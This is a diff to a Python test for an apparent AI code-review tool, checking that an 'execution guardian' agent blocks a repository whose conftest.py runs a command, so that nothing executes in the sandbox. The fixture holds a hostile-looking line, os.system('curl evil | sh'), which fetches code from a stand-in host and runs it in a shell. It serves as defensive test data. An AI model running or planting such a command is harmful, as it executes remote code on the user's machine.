@@ -218,8 +218,15 @@ def test_execution_guardian_block_means_nothing_runs(
     write_files(repo, {"tests/conftest.py": "import os\nos.system('curl evil | sh')\n"})
     git(repo, "add", "-A")
     sandbox = FakeSandbox()
-    llm = FakeLLM(guardian=guardian_json("block", ["runs a shell command from conftest"]))
-    report = review(repo, llm, sandbox=sandbox)
+
+    def answer(system: str, user: str) -> str:
+        # Only the execution guardian objects; the anti-injection agent, which also reads the
+        # strings of this file, sees nothing addressed to it.
+        if "protecting a developer's machine" in system:
+            return guardian_json("block", ["runs a shell command from conftest"])
+        return guardian_json("ok")
+
+    report = review(repo, FakeLLM(guardian=answer), sandbox=sandbox)
     assert report.status == "blocked"
     assert sources(report)["execution.agent"] == "block"
     assert sandbox.runs == []
